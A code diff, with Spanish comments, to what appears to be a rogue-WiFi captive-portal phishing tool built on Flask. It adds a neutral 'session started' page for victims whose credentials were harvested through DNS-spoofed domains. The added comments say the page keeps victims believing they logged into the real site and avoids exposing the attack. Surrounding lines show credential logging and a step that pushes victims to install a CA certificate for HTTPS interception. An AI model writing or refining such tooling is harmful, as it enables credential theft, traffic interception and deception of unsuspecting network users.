@@ -164,6 +164,35 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 </html>
 """
 
+# Página neutra de "sesión iniciada" -- SIN marca de WiFi/portal cautivo y SIN
+# redirect automático. Se usa en vez de _PORTAL_HTML_SUCCESS cuando las
+# credenciales llegan desde un dominio spoofado (DNS Spoofing por dominio):
+# mostrar "Conectado a la WiFi... redirigiendo a Google" ahi rompe la ilusion
+# de que la victima acaba de iniciar sesion en el sitio real que creia visitar.
+_PORTAL_HTML_SPOOF_SUCCESS = """<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sesión iniciada</title>
+<style>
+  body { font-family:Arial,sans-serif; background:#f2f2f2;
+         display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+  .box { background:white; border-radius:8px; padding:40px; text-align:center;
+         box-shadow:0 2px 10px rgba(0,0,0,.1); max-width:380px; }
+  h2 { color:#2e7d32; font-size:22px; margin-bottom:10px; }
+  p  { color:#5f6368; font-size:14px; }
+</style>
+</head>
+<body>
+<div class="box">
+  <h2>Sesión iniciada correctamente</h2>
+  <p>Tu sesión se ha verificado correctamente.</p>
+</div>
+</body>
+</html>
+"""
+
 # Página de instalación del certificado CA (para interceptar HTTPS/HSTS)
 # El usuario debe instalar este cert para que el MITM funcione con sitios HTTPS
 _PORTAL_HTML_INSTALL_CA = """<!DOCTYPE html>
@@ -758,6 +787,11 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
         # En modo MITM: tras el login pedimos instalar el CA para interceptar HTTPS
         if mitm_mode and ca_cert_path and os.path.isfile(ca_cert_path):
             return redirect("http://" + gateway_ip + "/install-cert", 302)
+        # Si las credenciales vinieron de un dominio spoofado (DNS Spoofing por
+        # dominio), no mostrar la pantalla de "Conectado a la WiFi" + redirect
+        # a Google: delataria el ataque. Mostramos una pagina neutra en su lugar.
+        if _get_spoof_html_for_request() is not None:
+            return make_response(_PORTAL_HTML_SPOOF_SUCCESS, 200)
         return make_response(_PORTAL_HTML_SUCCESS, 200)
 
     @app.route("/favicon.ico")
